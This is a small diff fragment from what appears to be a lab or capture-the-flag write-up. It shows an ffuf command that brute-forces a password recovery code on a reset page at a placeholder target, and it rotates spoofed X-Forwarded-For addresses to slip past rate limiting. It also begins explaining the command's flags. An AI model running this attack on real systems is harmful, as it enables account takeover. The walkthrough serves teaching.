@@ -96,7 +96,7 @@ for X in {0..255}; do for Y in {0..255}; do echo "192.168.$X.$Y"; done; done > f
 ## Run attack
 ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 -u "http://<target_IP>:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=<SESSIONID>" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt
 
-'Explain
+'' Explain
 **-w** — This is naming the two lists we are using. Both are followed by a colon : and then the code we will use when Fuzzing, e.g. you will see W1 where we are putting the auth code, and W2 where we put the IPs.
 
 **-u** This is our target URL.
